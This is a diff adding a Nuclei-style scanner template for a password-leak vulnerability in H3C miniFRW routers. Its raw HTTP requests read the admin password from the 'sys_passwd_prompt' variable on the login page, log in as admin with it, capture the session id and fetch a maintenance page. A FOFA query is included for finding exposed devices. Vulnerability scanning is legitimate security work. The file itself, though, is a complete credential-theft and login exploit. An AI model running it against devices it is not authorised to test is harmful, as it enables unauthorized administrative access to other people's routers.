@@ -1,0 +1,63 @@
+id: h3c-minifrw-sys_passwd_prompt-infoleak
+info:
+  name: h3c-minifrw-sys_passwd_prompt-infoleak
+  author: unknow
+  severity: critical
+  description: h3c minifrw路由器 sys_passwd_prompt存在信息泄露漏洞。
+  tags: h3c,infoleak
+  metadata:
+    fofa-query: body="sys_passwd_prompt"
+http:
+  - raw:
+      - |
+        GET /userLogin.asp HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 
+      - |
+        POST /userLogin.asp HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0   
+        Content-Type: application/x-www-form-urlencoded
+        Referer:http://{{Hostname}}/userLogin.asp      
+
+        save2Cookie=&vldcode=&account=admin&password={{password}}&btnSubmit=+%%B5%%C7%%C2%%BC+
+      - |
+        GET /maintain_basic.asp HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        DNT: 1
+        Connection: close
+        Referer: http://{{Hostname}}/home.asp
+        Cookie: JSESSIONID={{sessionid}}
+        Upgrade-Insecure-Requests: 1
+
+    extractors:
+      - type: regex
+        part: body_1
+        name: password
+        group: 1
+        internal: true
+        regex:
+          - 'var sys_passwd_prompt =\"(.*?)\";'        
+      - type: regex
+        part: body_2
+        name: sessionid
+        group: 1
+        internal: true
+        regex:
+          - 'var sessionid=\"(.*?)\";'             
+      - type: regex
+        part: body_1
+        name: password_echo
+        group: 1
+        regex:
+          - 'var sys_passwd_prompt =\"(.*?)\";'
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200 && contains(body_2, "系统登录中...") && contains(header_2, "text/html") && status_code_3 == 200 && contains(body_3, "oui_sn =")'
